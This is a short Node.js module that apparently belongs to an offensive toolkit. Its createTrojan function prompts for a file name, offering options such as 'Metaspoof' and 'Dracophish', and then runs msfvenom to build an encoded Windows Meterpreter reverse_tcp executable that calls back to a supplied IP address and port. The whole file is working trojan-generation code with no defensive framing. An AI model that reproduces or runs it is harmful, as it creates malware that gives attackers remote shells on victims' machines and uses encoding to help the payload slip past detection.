const inquirer = require("inquirer");
inquirer.registerPrompt("suggest", require("inquirer-prompt-suggest"));

exports.createTrojan = (exec, q, { ip, port }) => {
  var deferred = q.defer();

  inquirer
    .prompt([
      {
        type: "suggest",
        message: "Enter desired file name",
        name: "fileName",
        suggestions: [
          "Grenbufoat",
          "Lucarencrypt",
          "Metaspoof",
          "Haxxorus",
          "Regicontrol",
          "Dracophish",
        ],
      },
    ])
    .then((answer) => {
      const createTrojan =
        `msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp` +
        ` LHOST=${ip} LPORT=${port} -b x00 -e x86/shikata_ga_nai -f exe -o bin/${answer.fileName}.exe`;

      exec(createTrojan, (error, stdout, stderr) => {
        return error
          ? deferred.reject(stderr + new Error(error.stack || error))
          : deferred.resolve(stdout);
      });
    })
    .catch((error) => {
      console.log(error);
    });

  return deferred.promise;
};
